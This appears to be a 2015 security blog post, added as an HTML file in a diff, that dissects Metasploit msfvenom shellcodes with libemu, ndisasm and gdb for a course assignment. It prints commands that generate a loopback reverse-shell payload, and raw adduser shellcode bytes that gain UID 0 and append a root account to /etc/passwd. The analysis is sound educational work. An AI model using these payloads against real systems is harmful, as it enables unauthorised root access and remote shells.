@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>    Dissecting msfvenom shellcodes (SLAE, Assignment #5)
+</title>
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href="http://unlim.xyz/theme/css/cid.css">
+        <link href="http://unlim.xyz/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Security Nomad Atom Feed" />
+        
+ 
+        <link rel="apple-touch-icon" sizes="57x57" href="/icons/apple-touch-icon-57x57.png">
+        <link rel="apple-touch-icon" sizes="60x60" href="/icons/apple-touch-icon-60x60.png">
+        <link rel="apple-touch-icon" sizes="72x72" href="/icons/apple-touch-icon-72x72.png">
+        <link rel="apple-touch-icon" sizes="76x76" href="/icons/apple-touch-icon-76x76.png">
+        <link rel="apple-touch-icon" sizes="114x114" href="/icons/apple-touch-icon-114x114.png">
+        <link rel="apple-touch-icon" sizes="120x120" href="/icons/apple-touch-icon-120x120.png">
+        <link rel="apple-touch-icon" sizes="144x144" href="/icons/apple-touch-icon-144x144.png">
+        <link rel="apple-touch-icon" sizes="152x152" href="/icons/apple-touch-icon-152x152.png">
+        <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon-180x180.png">
+        <link rel="icon" type="image/png" href="/icons/favicon-32x32.png" sizes="32x32">
+        <link rel="icon" type="image/png" href="/icons/favicon-194x194.png" sizes="194x194">
+        <link rel="icon" type="image/png" href="/icons/favicon-96x96.png" sizes="96x96">
+        <link rel="icon" type="image/png" href="/icons/android-chrome-192x192.png" sizes="192x192">
+        <link rel="icon" type="image/png" href="/icons/favicon-16x16.png" sizes="16x16">
+        <link rel="manifest" href="/icons/manifest.json">
+        <link rel="shortcut icon" href="/icons/favicon.ico">
+        <meta name="msapplication-TileColor" content="#ffffff">
+        <meta name="msapplication-TileImage" content="/icons/mstile-144x144.png">
+        <meta name="msapplication-config" content="/icons/browserconfig.xml">
+        <meta name="theme-color" content="#ffffff">
+    </head>
+    <body>
+        <!--[if lt IE 7]>
+            <p class="chromeframe">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> or <a href="http://www.google.com/chromeframe/?redirect=true">activate Google Chrome Frame</a> to improve your experience.</p>
+        <![endif]-->
+
+            <div class="container">
+
+<header class="blog-header">
+    <h1><a href="http://unlim.xyz/">Security Nomad</a></h1>
+    <p> Wandering the cyber security realm </p>
+    <nav>
+        <a href="http://unlim.xyz/categories.html">CATEGORIES</a>
+        <a href="http://unlim.xyz/tags.html">TAGS</a>
+        <a href="http://unlim.xyz/archives.html">ARCHIVES</a>
+    </nav>
+</header>
+
+    <div class="post">
+
+        <header>
+            <h1>Dissecting msfvenom shellcodes (SLAE, Assignment #5)</h1>
+            <p class="category">
+                Category: <a class="category" href="http://unlim.xyz/category/slae.html"><b>SLAE</b></a>
+            </p>
+            <p class="date">
+                Written on <time datetime="2015-10-07T20:00:00-04:00">Oct 07, 2015</time>
+            </p>
+        </header>
+
+        <article>
+            <p>In this post I will discuss how a shellcode logic and architecture can be understood. For that I will use <code>libemu</code>, <code>ndisasm</code>, and <code>gdb</code>. <code>libemu</code> is an x86 shellcode emulation framework that allows one to faster understand the shellcode logic. <code>ndisasm</code> is a disassembler that comes as a part of <code>nasm</code> package on Kali. And <code>gdb</code> is the venerable GNU Debugger, arguably the best debugger for Linux if you are into CLI.</p>
+<p>To generate payloads I will use Metasploit Framework (MSF). And instead of used in the past and recently phased out <code>msfpayload</code> tool I will use its better replacement - <code>msfvenom</code>.</p>
+<h1>Installation of libemu</h1>
+<p>When I was installing <code>libemu</code> I expected to find it in Kali repositories, but alas it wasn't there. After googling a bit I found that most of the links led to <a href="http://libemu.carnivore.it">libemu.carnivore.it</a> page that was down at the time of this writing. So I had to find and fork its source code elsewhere on the GitHub. After getting my hands on its source code I followed this <a href="http://blog.xanda.org/2012/05/16/installation-of-libemu-and-pylibemu-on-ubuntu/">guide on libemu installation</a> successfully installed it on my system:</p>
+<div class="highlight"><pre><span class="c"># The only dependency I had to satisfy on my Kali machine</span>
+apt-get install libtool
+<span class="nb">cd</span> ~/Downloads
+
+<span class="c"># Cloning the source code from my GitHub repo</span>
+git clone --depth<span class="o">=</span><span class="m">1</span> https://github.com/reider-roque/libemu
+<span class="nb">cd </span>libemu
+
+<span class="c"># Building and installing libemu</span>
+autoreconf -i -v
+./configure --prefix<span class="o">=</span>/opt/libemu
+make install
+</pre></div>
+
+
+<h1>Example #1: Reverse shell</h1>
+<p>With the following command we will first see what Linux x86 payloads are available:</p>
+<div class="highlight"><pre>msfvenom --list payloads <span class="p">|</span> grep linux/x86
+</pre></div>
+
+
+<p>Output (truncated):</p>
+<div class="highlight"><pre>linux/x86/adduser       Create a new user with UID 0
+linux/x86/chmod         Runs chmod on specified file with specified mode
+linux/x86/exec          Execute an arbitrary command
+linux/x86/meterpreter/bind_ipv6_tcp   
+Inject the meterpreter server payload (staged). Listen for an IPv6 connection (Linux x86)
+linux/x86/meterpreter/bind_ipv6_tcp_uuid            
+Inject the meterpreter server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
+linux/x86/meterpreter/bind_nonx_tcp
+Inject the meterpreter server payload (staged). Listen for a connection
+linux/x86/meterpreter/bind_tcp
+Inject the meterpreter server payload (staged). Listen for a connection (Linux x86)
+...
+</pre></div>
+
+
+<p>As you can see, most of the available payloads are for spawning either reverse or bind shells. By the way this is the reason the shellcode is called so: shellcode is a sequence of assembly instructions that is most often used in exploits to spawn an (administrative) shell.</p>
+<p>For the first example I will take and dissect the reverse shell payload. Let's first see if there are mandatory options for this payload (output is truncated for brevity):</p>
+<div class="highlight"><pre>msfvenom -p linux/x86/shell_reverse_tcp --payload-options
+</pre></div>
+
+
+<p>Output:</p>
+<div class="highlight"><pre>Options for payload/linux/x86/shell_reverse_tcp:
+...
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+LHOST                   yes       The listen address
+LPORT  4444             yes       The listen port
+...
+</pre></div>
+
+
+<p>From the output above we can see that there are two required options, with one of them not having any default value. So for proper work of the payload we can leave <code>LPORT</code> at its default value, but we'll need to supply the <code>LHOST</code>.</p>
+<p>Below I will pipe the generated payload into the <code>sctest</code>, binary that comes with <code>libemu</code> framework, which will analyze the code and try to generate a high level structure of the shellcode:</p>
+<div class="highlight"><pre>msfvenom -p linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.1.1.1 -f raw <span class="p">|</span> /opt/libemu/bin/sctest -vvv -S -s <span class="m">100000</span> -G tmp.dot
+</pre></div>
+
+
+<p>The <code>-vvv</code> option to <code>sctest</code> increases verbosity. The <code>-S</code> is for reading input from stdin. The <code>-s</code> option controls the maximum number of instructions to execute and defaults to 1, which means <code>sctest</code> will emulate execution of only the first instruction of the supplied shellcode. To be on the safe side and make sure that every shellcode instruction is executed it is usually set to some big number, like 100000.</p>
+<p><img alt="Top of the sctest output" src="http://unlim.xyz/images/dissecting-msfvenom-shellcodes/sctest-top-output.png" title="Top of the sctest output" />
+<div class="img-caption">Top of the sctest output</div></p>
+<p>At the top of the output you can see how <code>sctest</code> tears down the shellcode instruction by instruction and shows you the state of registers after execution of each instruction. At the bottom of the output you will find the reconstructed high level view of what's going on:</p>
+<div class="highlight"><pre><span class="kt">int</span> <span class="n">socket</span> <span class="p">(</span>
+     <span class="kt">int</span> <span class="n">domain</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+     <span class="kt">int</span> <span class="n">type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+     <span class="kt">int</span> <span class="n">protocol</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">)</span> <span class="o">=</span>  <span class="mi">14</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">dup2</span> <span class="p">(</span>
+     <span class="kt">int</span> <span class="n">oldfd</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span>
+     <span class="kt">int</span> <span class="n">newfd</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+<span class="p">)</span> <span class="o">=</span>  <span class="mi">2</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">dup2</span> <span class="p">(</span>
+     <span class="kt">int</span> <span class="n">oldfd</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span>
+     <span class="kt">int</span> <span class="n">newfd</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">)</span> <span class="o">=</span>  <span class="mi">1</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">dup2</span> <span class="p">(</span>
+     <span class="kt">int</span> <span class="n">oldfd</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span>
+     <span class="kt">int</span> <span class="n">newfd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">)</span> <span class="o">=</span>  <span class="mi">0</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">connect</span> <span class="p">(</span>
+     <span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span>
+     <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="o">*</span> <span class="n">serv_addr</span> <span class="o">=</span> <span class="mh">0x00416fbe</span> <span class="o">=&gt;</span> 
+         <span class="k">struct</span>   <span class="o">=</span> <span class="p">{</span>
+             <span class="kt">short</span> <span class="n">sin_family</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+             <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">sin_port</span> <span class="o">=</span> <span class="mi">23569</span> <span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="mi">4444</span><span class="p">);</span>
+             <span class="k">struct</span> <span class="n">in_addr</span> <span class="n">sin_addr</span> <span class="o">=</span> <span class="p">{</span>
+                 <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">s_addr</span> <span class="o">=</span> <span class="mi">16843135</span> <span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="mf">127.1.1.1</span><span class="p">);</span>
+             <span class="p">};</span>
+             <span class="kt">char</span> <span class="n">sin_zero</span> <span class="o">=</span> <span class="s">&quot;       &quot;</span><span class="p">;</span>
+         <span class="p">};</span>
+     <span class="kt">int</span> <span class="n">addrlen</span> <span class="o">=</span> <span class="mi">102</span><span class="p">;</span>
+<span class="p">)</span> <span class="o">=</span>  <span class="mi">0</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">execve</span> <span class="p">(</span>
+     <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">dateiname</span> <span class="o">=</span> <span class="mh">0x00416fa6</span> <span class="o">=&gt;</span> 
+           <span class="o">=</span> <span class="s">&quot;/bin//sh&quot;</span><span class="p">;</span>
+     <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">[</span>
+           <span class="o">=</span> <span class="mh">0x00416f9e</span> <span class="o">=&gt;</span> 
+               <span class="o">=</span> <span class="mh">0x00416fa6</span> <span class="o">=&gt;</span> 
+                   <span class="o">=</span> <span class="s">&quot;/bin//sh&quot;</span><span class="p">;</span>
+           <span class="o">=</span> <span class="mh">0x00000000</span> <span class="o">=&gt;</span> 
+             <span class="n">none</span><span class="p">;</span>
+     <span class="p">];</span>
+     <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="mh">0x00000000</span> <span class="o">=&gt;</span> 
+         <span class="n">none</span><span class="p">;</span>
+<span class="p">)</span> <span class="o">=</span>  <span class="mi">0</span><span class="p">;</span>
+</pre></div>
+
+
+<p>At first glance I thought that <code>sctest</code> reconstructed the whole program in C, but then quickly realized that it is just a C-like syntax. Nevertheless the job <code>sctest</code> did in this department is amazing.</p>
+<p>From the output above you can tell that at first the shellcode creates a socket with the <code>socket()</code> function. Then it forwards process's standard input, output and error to that socket with several calls to <code>dup2()</code> function. After that it initiates a connection to 127.1.1.1 address on port 4444 using <code>connect()</code> function, just as we wanted it to. And finally it spawns the <code>/bin/sh</code> shell using <code>execve()</code>.</p>
+<p>As you can see using <code>sctest</code> we were able to understand what the shellcode does without even disassembling it. But this is not always the case. Let's take a look at the next example.</p>
+<h1>Example #2: Chmod</h1>
+<p>As in the previous example I will pipe the generated shellcode into <code>sctest</code>. This time it will be the chmod payload. All it does is modify Unix permissions on a file to, by default, 0666.</p>
+<div class="highlight"><pre>msfvenom -p linux/x86/chmod <span class="nv">FILE</span><span class="o">=</span>tmp.bin -f raw <span class="p">|</span> /opt/libemu/bin/sctest -vvv -S -s <span class="m">100000</span> -G tmp.dot
+</pre></div>
+
+
+<p>The <code>-G</code> option supplied to the sctest command outputs a graph of shellcode logic in the dot file format, that can be further converted into an image using <code>dot</code> utility. Looking at the depicted algorithm sometimes facilitates a better understanding of what's happening, especially when the shellcode extensively uses loops and branching.</p>
+<p>After running the above command the high level output I got was this:</p>
+<div class="highlight"><pre><span class="n">ERROR</span>  <span class="n">chmod</span> <span class="p">(</span>
+<span class="p">)</span> <span class="o">=</span>  <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="n">ERROR</span>  <span class="n">exit</span> <span class="p">(</span>
+     <span class="kt">int</span> <span class="n">status</span> <span class="o">=</span> <span class="mi">4288522</span><span class="p">;</span>
+<span class="p">)</span> <span class="o">=</span>  <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</pre></div>
+
+
+<p>Looking at it I could tell that the shellcode probably calls the <code>chmod()</code> and <code>exit()</code> functions, but what parameters were passed to <code>chmod()</code> is not clear. Let's take a look at the graph converted from dot to png file format:</p>
+<div class="highlight"><pre>dot -Tpng -o tmp.png tmp.dot <span class="o">&amp;&amp;</span> eog tmp.png
+</pre></div>
+
+
+<p><img alt="Chmod shellcode call graph" src="http://unlim.xyz/images/dissecting-msfvenom-shellcodes/chmod-shellcode-call-graph.png" title="Chmod shellcode call graph" />
+<div class="img-caption">Chmod shellcode call graph</div></p>
+<p>On the call graph we can again see that <code>sctest</code> definitely caught calls to the <code>chmod()</code> and <code>exit()</code> functions. We can also see that the second argument (ECX register) to the <code>chmod</code> system call is set to <em>0x1b6</em>, which, as we can confirm on Linux command line with </p>
+<div class="highlight"><pre><span class="nb">printf</span> <span class="s2">&quot;%o\n&quot;</span> 0x1b6 
+</pre></div>
+
+
+<p>command translates into <em>666</em> in the octal numeral system, which is the default permissions used by the shellcode. </p>
+<p>Next, because of the call-pop instruction sequence we may suppose that the first argument to the <code>chmod()</code> is probably set using the call-pop technique which is a modification of the venerable jmp-call-pop technique with data coming before the destination of call jump. The fact that the graph shows relative address of 0x1 as a call destination is odd and we'll have to use <code>ndisasm</code> and <code>gdb</code> to understand why it is so. But I reserved this activity to a similar problem in the last example that follows.</p>
+<p>Also note that the above shellcode contains null bytes. That is because <code>msfvenom</code> does not care about bad characters if you don't tell it to. And although I do not encrypt payloads in my examples here, note that <code>sctest</code> can equally work its way through encrypted shellcodes.</p>
+<h1>Example #3: Adduser</h1>
+<p>In this example I want to zero in on the case where the <code>sctest</code> is mostly useless and some interaction with <code>gdb</code> is needed to fully see the shellcode through.</p>
+<p>After running the following command,</p>
+<div class="highlight"><pre>msfvenom -p linux/x86/adduser -f raw <span class="p">|</span> /opt/libemu/bin/sctest -vvv -S -s <span class="m">100000</span> -G tmp.dot
+</pre></div>
+
+
+<p>you will see that <code>sctest</code> was not able to generate a high view of the shellcode logic and even the tmp.dot call graph is empty.</p>
+<p>Let's try a different approach and disassemble the shellcode with <code>ndisasm</code>:</p>
+<div class="highlight"><pre>msfvenom -p linux/x86/adduser -f raw &gt; tmp.bin <span class="o">&amp;&amp;</span> ndisasm -b32 tmp.bin
+</pre></div>
+
+
+<p>Below is the output of the above command with my comments. I truncated the "gibberish" part to save some space.</p>
+<div class="highlight"><pre><span class="err">00000000</span>  <span class="err">31</span><span class="nf">C9</span>              <span class="nv">xor</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span> <span class="err">#</span> <span class="nv">zero</span> <span class="nv">out</span> <span class="nb">ECX</span> <span class="nv">and</span> <span class="nb">EBX</span>
+<span class="err">00000002</span>  <span class="err">89</span><span class="nf">CB</span>              <span class="nv">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ecx</span>
+<span class="err">00000004</span>  <span class="err">6</span><span class="nf">A46</span>              <span class="nv">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0x46</span> <span class="err">#</span> <span class="nv">load</span> <span class="nb">EAX</span> <span class="nv">with</span> <span class="mh">0x46</span><span class="p">,</span> <span class="nv">corresponding</span>
+<span class="err">00000006</span>  <span class="err">58</span>                <span class="nf">pop</span> <span class="nb">eax</span>     <span class="err">#</span> <span class="nv">to</span> <span class="nv">setreuid</span> <span class="nv">syscall</span> <span class="err">#</span>
+<span class="err">00000007</span>  <span class="nf">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
+<span class="err">00000009</span>  <span class="err">6</span><span class="nf">A05</span>              <span class="nv">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0x5</span>  <span class="err">#</span> <span class="nv">load</span> <span class="nb">EAX</span> <span class="nv">with</span> <span class="nv">open</span> <span class="nv">syscall</span> <span class="err">#</span>
+<span class="err">0000000</span><span class="nf">B</span>  <span class="mi">58</span>                <span class="nv">pop</span> <span class="nb">eax</span>
+<span class="err">0000000</span><span class="nf">C</span>  <span class="mi">31</span><span class="nv">C9</span>              <span class="nv">xor</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span> 
+<span class="err">0000000</span><span class="nf">E</span>  <span class="mi">51</span>                <span class="nv">push</span> <span class="nb">ecx</span>        <span class="err">#</span> <span class="nv">push</span> <span class="nv">some</span> <span class="nv">nulls</span> <span class="nv">to</span> <span class="nv">the</span> <span class="nv">stack</span>
+<span class="err">0000000</span><span class="nf">F</span>  <span class="mi">6873737764</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x64777373</span>       <span class="err">#</span> <span class="nv">pushing</span> <span class="o">/</span><span class="nv">etc</span><span class="o">//</span><span class="nv">passwd</span>
+<span class="err">00000014</span>  <span class="err">682</span><span class="nf">F2F7061</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x61702f2f</span>       <span class="err">#</span> <span class="nv">string</span> <span class="nv">to</span> <span class="nv">the</span> <span class="nv">stack</span>
+<span class="err">00000019</span>  <span class="err">682</span><span class="nf">F657463</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x6374652f</span>
+<span class="err">0000001</span><span class="nf">E</span>  <span class="mi">89</span><span class="nv">E3</span>              <span class="nv">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esp</span>
+<span class="err">00000020</span>  <span class="err">41</span>                <span class="nf">inc</span> <span class="nb">ecx</span>     <span class="err">#</span> <span class="nb">ECX</span> <span class="nv">is</span> <span class="nv">now</span> <span class="err">=</span> <span class="mi">1</span>
+<span class="err">00000021</span>  <span class="nf">B504</span>              <span class="nv">mov</span> <span class="nb">ch</span><span class="p">,</span><span class="mh">0x4</span>      <span class="err">#</span> <span class="nb">ECX</span> <span class="nv">is</span> <span class="nv">now</span> <span class="err">=</span> <span class="mi">1025</span><span class="p">,</span> <span class="nv">or</span> <span class="mi">2001</span> <span class="nv">in</span> <span class="nv">octal</span>
+<span class="err">00000023</span>  <span class="nf">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
+<span class="err">00000025</span>  <span class="err">93</span>                <span class="nf">xchg</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">ebx</span>
+<span class="err">00000026</span>  <span class="nf">E828000000</span>        <span class="nv">call</span> <span class="kt">dword</span> <span class="mh">0x53</span>
+<span class="err">0000002</span><span class="nf">B</span>  <span class="mi">6</span><span class="nv">D</span>                <span class="nv">insd</span>            <span class="err">#</span> <span class="nv">gibberish</span> <span class="nv">begins</span>
+<span class="err">0000002</span><span class="nf">C</span>  <span class="mi">657461</span>            <span class="nb">gs</span> <span class="nv">jz</span> <span class="mh">0x90</span>
+<span class="nf">......................................</span>
+<span class="err">00000052</span>  <span class="err">0</span><span class="nf">A598B</span>            <span class="nv">or</span> <span class="nb">bl</span><span class="p">,[</span><span class="nb">ecx</span><span class="o">-</span><span class="mh">0x75</span><span class="p">]</span>
+<span class="err">00000055</span>  <span class="err">51</span>                <span class="nf">push</span> <span class="nb">ecx</span>
+<span class="err">00000056</span>  <span class="nf">FC</span>                <span class="nb">cl</span><span class="nv">d</span>         <span class="err">#</span> <span class="nv">gibberish</span> <span class="nv">ends</span>
+<span class="err">00000057</span>  <span class="err">6</span><span class="nf">A04</span>              <span class="nv">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0x4</span>  <span class="err">#</span> <span class="nv">load</span> <span class="nb">EAX</span> <span class="nv">with</span> <span class="nv">write</span> <span class="nv">syscall</span> <span class="err">#</span>
+<span class="err">00000059</span>  <span class="err">58</span>                <span class="nf">pop</span> <span class="nb">eax</span>
+<span class="err">0000005</span><span class="nf">A</span>  <span class="nv">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
+<span class="err">0000005</span><span class="nf">C</span>  <span class="mi">6</span><span class="nv">A01</span>              <span class="nv">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0x1</span>  <span class="err">#</span> <span class="nv">load</span> <span class="nb">EAX</span> <span class="nv">with</span> <span class="nv">exit</span> <span class="nv">syscall</span> <span class="err">#</span>
+<span class="err">0000005</span><span class="nf">E</span>  <span class="mi">58</span>                <span class="nv">pop</span> <span class="nb">eax</span>
+<span class="err">0000005</span><span class="nf">F</span>  <span class="nv">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
+</pre></div>
+
+
+<p>Looking at the above disassembly and my comments you can tell that the shellcode:</p>
+<ol>
+<li>Sets real and effective UID to 0 (gets root privileges)</li>
+<li>Opens <code>/etc/passwd</code> file</li>
+<li>Writes something into it, and</li>
+<li>Exits</li>
+</ol>
+<p>Knowing that the shellcode adds a user named <em>metasploit</em> with the same password it is not difficult to guess what exactly is written to the <code>/etc/passwd</code>. Knowing what exactly the shellcode does I actually ran it and sure enough found <em>metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh</em> string inserted as a last thing in the file.</p>
+<p>To decipher the syscall codes I used the <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code> file where Linux x86 system calls are defined.</p>
+<p>The 2001 octal number pushed to ECX represents file access mode flags. To understand what it means I looked into the <code>/usr/include/asm-generic/fcntl.h</code> file, where <code>open()</code> function flags are defined. 2001 represented a combination of <code>O_WRONLY</code> (01) and <code>O_APPEND</code> (02000) flags, which makes a perfect sense for the action the shellcode takes.</p>
+<p>Now the interesting part. Note that the call instruction jumps to the 0x53 address. But then there is no separate instructions at that address. There is an instruction at the address 0x52 and then at 0x55. This fact indicates that in the "gibberish" part of the code some incorrect sequence of bytes confused the disassembler and the bytes-to-opcodes translation went off. </p>
+<p>Note the sequence of bytes at the 0x52 address - 0A598B. The 53rd byte, where the <code>call</code> instruction jumps is 59. I will regenerate payload in the C format, take the part starting from 53rd byte and disassemble it to get the correct bytes-to-opcodes translation. For that I will use the <a href="https://github.com/reider-roque/reed/tree/master/tools">scdisas</a> script that I created while going through the SLAE course materials.</p>
+<p>Producing shellcode in the format ready to be pasted into a C program:</p>
+<div class="highlight"><pre>msfvenom -p linux/x86/adduser -f c
+</pre></div>
+
+
+<p>Output (truncated):</p>
+<div class="highlight"><pre>...
+&quot;\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51&quot;
+&quot;\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63&quot;
+&quot;\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65&quot;
+&quot;\x74\x61\x73\x70\x6c\x6f\x69\x74\x3a\x41\x7a\x2f\x64\x49\x73&quot;
+&quot;\x6a\x34\x70\x34\x49\x52\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a&quot;
+&quot;\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58&quot;
+&quot;\xcd\x80\x6a\x01\x58\xcd\x80&quot;;
+</pre></div>
+
+
+<p>Disassembling of the shellcode starting from 52nd byte:</p>
+<div class="highlight"><pre>scdisas <span class="s2">&quot;\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80&quot;</span>
+</pre></div>
+
+
+<p>Output:</p>
+<div class="highlight"><pre>00000000  59                pop ecx
+00000001  8B51FC            mov edx,[ecx-0x4]
+00000004  6A04              push byte +0x4
+00000006  58                pop eax
+00000007  CD80              int 0x80
+00000009  6A01              push byte +0x1
+0000000B  58                pop eax
+0000000C  CD80              int 0x80
+</pre></div>
+
+
+<p>In the above output you can see that the instruction where call passes execution flow is pop instruction. And that means that the shellcode employed the variation of jmp-call-pop technique, as encountered in the previous example. So what I called "gibberish" is actually some kind of data, most likely a string, address to which gets loaded into ECX register. By now we already know what string it is, but just to make sure let's take a look at it in <code>gdb</code>.</p>
+<p>To run the shellcode in <code>gdb</code> I'll save it in the ELF format. The ELF format that <code>msfvenom</code> outputs runs without any problems, but the binary is stripped of all symbols, which means that we won't be able to set a breakpoint on the <em>_start</em> or <em>main</em> labels. To find the entry point we can use the <code>readelf</code> utility. One of the lines from its output will point us to the address in question:</p>
+<div class="highlight"><pre>msfvenom -p linux/x86/adduser -f elf &gt; tmp.elf
+chmod +x tmp.elf
+readelf --headers tmp.elf
+</pre></div>
+
+
+<p>Output:</p>
+<div class="highlight"><pre>...
+  Entry point address:               0x8048054
+...
+</pre></div>
+
+
+<p>Below is the command sequence that gets us started with gdb:</p>
+<div class="highlight"><pre>gdb tmp.elf
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x8048054
+<span class="o">(</span>gdb<span class="o">)</span> run
+<span class="o">(</span>gdb<span class="o">)</span> disas <span class="nv">$eip</span>,+45
+</pre></div>
+
+
+<p><img alt="Disassembly view in gdb" src="http://unlim.xyz/images/dissecting-msfvenom-shellcodes/disassembly-view-in-gdb.png" title="Disassembly view in gdb" />
+<div class="img-caption">Disassembly view in gdb</div></p>
+<p>On the above picture you can see that the data starts at the address following the <code>call</code> instruction which is 0x0804807f. And running either of the following two commands we can be certain that the 40 bytes of the data represent the string that as we saw earlier written to the <code>/etc/passwd</code> file:</p>
+<div class="highlight"><pre><span class="o">(</span>gdb<span class="o">)</span> x/40cb 0x0804807f
+<span class="o">(</span>gdb<span class="o">)</span> x/s 0x0804807f
+</pre></div>
+
+
+<p><img alt="Checking string data in gdb" src="http://unlim.xyz/images/dissecting-msfvenom-shellcodes/checking-string-data-in-gdb.png" title="Checking string data in gdb" />
+<div class="img-caption">Checking string data in gdb</div></p>
+<div class="divider"></div>
+
+<div class="divider"></div>
+
+<div class="divider"></div>
+
+<div class="divider"></div>
+
+<p><hr>
+This blog post was created for completing the requirements of the <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert</a> certification. Student id: SLAE-685.</p>
+<p>The source files created while completing the assignment can be found in my <a href="https://github.com/reider-roque/slae">GitHub repository</a>.</p>
+        </article>
+
+        <footer>
+            <p>
+                Tags:  
+ 
+                    <a class="tag" href="/tag/exploit-development.html">exploit-development</a>
+ 
+                    <a class="tag" href="/tag/slae.html">slae</a>
+            </p>
+        </footer>
+
+
+    </div>
+
+
+<footer class="blog-footer">
+
+    <ul class="nav">
+                <li><a href="http://unlim.xyz/blog/">Blog</a></li>
+            <li><a href="https://github.com/reider-roque">Github</h3>
+            </a></li>
+            <li><a href="https://linkedin.com/in/olegmi">Linkedin</h3>
+            </a></li>
+    <script type="text/javascript">
+        // JS ROT13 by http://techblog.tilllate.com/2008/07/20/ten-methods-to-obfuscate-e-mail-addresses-compared/
+        document.write( "<yv><n uers=\"znvygb:byrt@hayvz.klm\" ery=\"absbyybj\">Rznvy</n></yv>".replace(/[a-zA-Z]/g, function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);}));
+    </script>
+    </ul>
+
+    <p class="disclaimer">
+    Oleg Mitrofanov &copy; 2015
+    </p>
+</footer>
+            </div>
+    </body>
+</html>
